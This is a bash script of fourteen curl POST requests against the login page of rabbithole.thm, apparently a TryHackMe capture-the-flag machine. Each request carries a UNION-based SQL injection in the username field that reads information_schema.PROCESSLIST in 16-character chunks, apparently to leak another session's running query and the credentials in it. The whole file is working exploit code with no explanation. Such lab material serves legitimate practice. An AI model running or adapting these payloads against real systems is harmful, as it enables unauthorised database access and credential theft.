#!/bin/bash
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 197' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=1' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 1, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'  
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=2' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 17, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'  
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=3' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 33, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=4' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 49, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=5' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 65, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'    
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=6' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 81, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'    
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=7' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 97, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'    
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=8' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 113, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'    
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=9' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 129, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'    
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=10' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 145, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'    
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=11' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 161, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'      
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=12' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 177, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php' 
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=13' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 193, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'    
curl -i -s -k -X $'POST' \
    -H $'Host: rabbithole.thm' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 199' -H $'Origin: http://rabbithole.thm' -H $'Connection: close' -H $'Referer: http://rabbithole.thm/login.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=14' \
    --data-binary $'username=/\" UNION SELECT 1, SUBSTRING((SELECT INFO FROM information_schema.PROCESSLIST WHERE ID = (SELECT MIN(ID) FROM information_schema.PROCESSLIST)), 209, 16) -- -&password=asdf&login=Submit+Query' \
    $'http://rabbithole.thm/login.php'    
